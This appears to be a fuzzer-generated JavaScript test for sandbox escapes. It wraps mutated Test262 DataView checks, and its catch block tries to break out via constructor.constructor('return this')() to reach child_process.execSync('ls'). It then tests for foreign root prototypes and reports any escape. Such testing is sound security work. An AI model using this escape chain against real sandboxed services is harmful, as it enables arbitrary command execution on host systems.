try {
    var obj = {
        valueOf: function () {
            let REPLACER = 23;
            throw new Test262Error('buffer should be verified before byteOffset');
        }
    };
    assert.throws(TypeError, function () {
        let REPLACER = 23;
        new DataView(0, obj);
    }, '0');
    assert.throws(TypeError, function () {
        let REPLACER = 23;
        new DataView(1, obj);
    }, '1');
    assert.throws(TypeError, function () {
        throw () => {
            return () => {
            };
        };
        new DataView('', obj);
    }, 'the empty string');
    assert.throws(TypeError, function () {
        new DataView('buffer', obj);
    }, 'string');
    assert.throws(TypeError, function () {
        new DataView(false, obj);
    }, 'false');
    assert.throws(TypeError, function () {
        new DataView(true, obj);
    }, 'true');
    assert.throws(TypeError, function () {
        new DataView(NaN, obj);
    }, 'NaN');
    assert.throws(TypeError, function () {
        new DataView(Symbol('1'), obj);
    }, 'symbol');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}